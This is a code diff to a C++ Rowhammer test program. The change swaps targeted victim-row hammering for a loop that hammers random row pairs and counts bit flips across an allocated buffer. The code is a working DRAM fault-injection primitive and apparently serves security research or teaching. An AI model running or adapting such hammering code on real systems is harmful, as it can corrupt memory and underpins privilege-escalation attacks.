@@ -4,18 +4,18 @@
 #include <unistd.h>
 #include <set>
 
-uint32_t hammer(uint64_t vict_virt_addr, uint64_t attacker_virt_addr_1, uint64_t attacker_virt_addr_2) {
+uint32_t hammer(uint64_t attacker_virt_addr_1, uint64_t attacker_virt_addr_2) {
     // prime
-    uint8_t *vict_virt_addr_ptr = reinterpret_cast<uint8_t *>(vict_virt_addr);
-    uint8_t *attacker_virt_addr_1_ptr = reinterpret_cast<uint8_t *>(attacker_virt_addr_1);
-    uint8_t *attacker_virt_addr_2_ptr = reinterpret_cast<uint8_t *>(attacker_virt_addr_2);
-    memset(vict_virt_addr_ptr, 0x55, ROW_SIZE);
-    memset(attacker_virt_addr_1_ptr, 0xAA, ROW_SIZE);
-    memset(attacker_virt_addr_2_ptr, 0xAA, ROW_SIZE);
+    //uint8_t *vict_virt_addr_ptr = reinterpret_cast<uint8_t *>(vict_virt_addr);
+    //uint8_t *attacker_virt_addr_1_ptr = reinterpret_cast<uint8_t *>(attacker_virt_addr_1);
+    //uint8_t *attacker_virt_addr_2_ptr = reinterpret_cast<uint8_t *>(attacker_virt_addr_2);
+    //memset(vict_virt_addr_ptr, 0x55, ROW_SIZE);
+    //memset(attacker_virt_addr_1_ptr, 0xAA, ROW_SIZE);
+    //memset(attacker_virt_addr_2_ptr, 0xAA, ROW_SIZE);
     
-    flush_row(vict_virt_addr_ptr);
-    flush_row(attacker_virt_addr_1_ptr);
-    flush_row(attacker_virt_addr_2_ptr);
+    //flush_row(vict_virt_addr_ptr);
+    //flush_row(attacker_virt_addr_1_ptr);
+    //flush_row(attacker_virt_addr_2_ptr);
   
     int num_reads = HAMMERS_PER_ITER;
 
@@ -32,45 +32,57 @@ uint32_t hammer(uint64_t vict_virt_addr, uint64_t attacker_virt_addr_1, uint64_t
         );
     }
 
-    flush_row(vict_virt_addr_ptr);
+    /*flush_row(vict_virt_addr_ptr);
     uint32_t number_of_bitflips_in_target = count_flips(vict_virt_addr_ptr, 0x55);
     if (VERBOSE > 0) {
         print_result(vict_virt_addr, attacker_virt_addr_1, attacker_virt_addr_2, number_of_bitflips_in_target);
     }
     if (VERBOSE > 1 && number_of_bitflips_in_target) {
         print_diff(vict_virt_addr_ptr, 0x55);
-    }
-    return number_of_bitflips_in_target; 
+    }*/
+    return 0;// number_of_bitflips_in_target;
 }
 
 int main(int argc, char **argv) {
     setvbuf(stdout, NULL, _IONBF, 0);
     uint64_t mem_size = 1.8 * BUFFER_SIZE;
     allocated_mem = allocate_pages(mem_size);
-    setup_PPN_VPN_map(allocated_mem, mem_size);
+    //setup_PPN_VPN_map(allocated_mem, mem_size);
 
-    uint64_t victim; 
-    uint64_t* attacker_1 = (uint64_t*) calloc(1, sizeof(uint64_t));
-    uint64_t* attacker_2 = (uint64_t*) calloc(1, sizeof(uint64_t)); 
-    uint32_t num_bit_flips;
+    //uint64_t victim;
+    uint64_t attacker_1;// = (uint64_t) calloc(1, sizeof(uint64_t));
+    uint64_t attacker_2;// = (uint64_t) calloc(1, sizeof(uint64_t));
+    uint32_t num_total_flips;
+    int iter_count = 0;
     while (true) {
-        victim = (uint64_t)((uint8_t *)allocated_mem + ROW_SIZE * (rand() % (mem_size / PAGE_SIZE)));
+        for (int i = 0; i < BUFFER_SIZE; i++) {
+            attacker_1 = (uint64_t)((uint8_t *)allocated_mem + ROW_SIZE * (rand() % (mem_size / ROW_SIZE)));
+            attacker_2 = (uint64_t)((uint8_t *)allocated_mem + ROW_SIZE * (rand() % (mem_size / ROW_SIZE)));
+
+            hammer(attacker_1, attacker_2);
+            iter_count++;
+        }
+
+        num_total_flips = count_total_flips(allocated_mem, mem_size);
+        if (num_total_flips > 0) break;
 
         // row + 1, row - 1
-        if (get_addresses_to_hammer(virt_to_phys(victim), attacker_1, attacker_2, 1)) {
+        /*if (get_addresses_to_hammer(virt_to_phys(victim), attacker_1, attacker_2, 1)) {
             num_bit_flips = hammer(victim, *attacker_1, *attacker_2);
             if (num_bit_flips > 0) break;
-        }
+        }*/
     }
-    printf("Found vulnerable row at %ld (virt) with bitflips %d\n", victim, num_bit_flips);
+    /*printf("Found vulnerable row at %ld (virt) with bitflips %d\n", victim, num_bit_flips);
     num_bit_flips = hammer(victim, *attacker_1, *attacker_2);
     if (num_bit_flips > 0) {
         printf("Verified vulnerable row at %ld (virt) with bitflips %d\n", victim, num_bit_flips);
     } else {
         printf("Could not verify vulnerable row at %ld (virt) with bitflips %d\n", victim, num_bit_flips);
-    }
+    }*/
+
+    printf("Found %d bitflips after %d iterations of hammering", num_total_flips, iter_count);
     deallocate_pages(allocated_mem, mem_size);
-    free(attacker_1);
-    free(attacker_2);
+    //free(attacker_1);
+    //free(attacker_2);
 }
 
